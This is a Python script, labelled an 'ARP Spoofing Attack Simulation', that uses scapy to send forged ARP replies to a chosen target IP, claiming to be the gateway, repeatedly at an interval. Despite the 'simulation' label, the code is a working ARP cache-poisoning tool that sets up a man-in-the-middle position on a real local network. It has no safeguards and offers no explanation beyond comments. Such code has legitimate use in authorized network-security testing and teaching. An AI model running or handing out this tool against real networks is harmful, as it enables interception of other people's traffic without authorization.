#!/usr/bin/env python3
"""
ARP Spoofing Attack Simulation
This script simulates an ARP spoofing attack, which can be used for
man-in-the-middle attacks by intercepting traffic.
"""

import argparse
import sys
import time
from scapy.all import ARP, Ether, send, srp

def get_mac(ip, interface=None):
    arp = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    
    try:
        if interface:
            result = srp(packet, timeout=3, verbose=0, iface=interface)[0]
        else:
            result = srp(packet, timeout=3, verbose=0)[0]
        
        return result[0][1].hwsrc
    except Exception as e:
        print(f"Error getting MAC address for {ip}: {e}")
        return None

def arp_spoof(target_ip, gateway_ip, interface=None, packets_count=100, interval=2.0):
    print(f"Starting ARP spoofing simulation: target={target_ip}, gateway={gateway_ip}")
    
    try:
        target_mac = get_mac(target_ip, interface)
        if not target_mac:
            print(f"Could not get MAC address for {target_ip}. Using broadcast.")
            target_mac = "ff:ff:ff:ff:ff:ff"
        else:
            print(f"Target MAC: {target_mac}")
        
        sent_count = 0
        for i in range(packets_count):
            try:
                arp_response = ARP(
                    pdst=target_ip,
                    hwdst=target_mac,
                    psrc=gateway_ip,
                    op=2
                )
                
                send(arp_response, verbose=0, iface=interface)
                sent_count += 1
                
                if i % 5 == 0:
                    print(f"Sent {sent_count} ARP packets...")
                
                time.sleep(interval)
                
            except KeyboardInterrupt:
                break
                
            except Exception as e:
                print(f"Error sending ARP packet: {e}")
                continue
                
        print(f"\nARP spoofing simulation completed. Sent {sent_count} packets.")
    
    except KeyboardInterrupt:
        print("\nARP spoofing simulation interrupted by user")
    
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ARP Spoofing Attack Simulation")
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("gateway", help="Gateway IP address")
    parser.add_argument("-i", "--interface", help="Network interface to use")
    parser.add_argument("-c", "--count", type=int, default=50, help="Number of packets to send (default: 50)")
    parser.add_argument("-d", "--delay", type=float, default=2.0, help="Delay between packets in seconds (default: 2.0)")
    
    args = parser.parse_args()
    
    try:
        arp_spoof(args.target, args.gateway, args.interface, args.count, args.delay)
    except KeyboardInterrupt:
        print("\nARP spoofing simulation interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"An error occurred: {e}")
        sys.exit(1)